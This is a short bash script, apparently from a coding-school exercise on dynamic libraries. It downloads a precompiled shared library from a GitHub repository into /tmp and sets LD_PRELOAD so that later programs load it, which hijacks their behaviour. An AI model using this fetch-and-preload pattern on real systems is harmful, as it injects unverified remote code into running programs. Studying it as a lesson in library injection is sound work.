#!/bin/bash
wget -P /tmp https://github.com/dexterski007/alx-low_level_programming/raw/main/0x18-dynamic_libraries/success2.so
export LD_PRELOAD=/tmp/success2.so
